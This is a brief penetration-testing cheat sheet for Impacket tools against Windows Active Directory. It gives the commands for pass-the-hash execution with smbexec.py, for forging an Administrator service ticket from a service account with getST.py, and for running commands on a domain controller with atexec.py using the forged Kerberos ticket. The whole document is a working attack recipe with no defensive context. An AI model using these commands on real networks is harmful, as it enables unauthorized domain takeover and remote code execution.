# Impacket

## SMBExec
`smbexec.py -hashes <hash> <acc>@<dc>`

## GetST.py
Get Admin account from service account
`getST.py <dc>/<acc> -spn WWW/<dc> -hashes <hash> -impersonate Administrator`

If you get a clock skew too great error do:
`ntpdate <dc>`

## atexec.py
`export KRB5CCNAME=Administrator.ccache`

`atexec.py -k -no-pass <dc> <command>`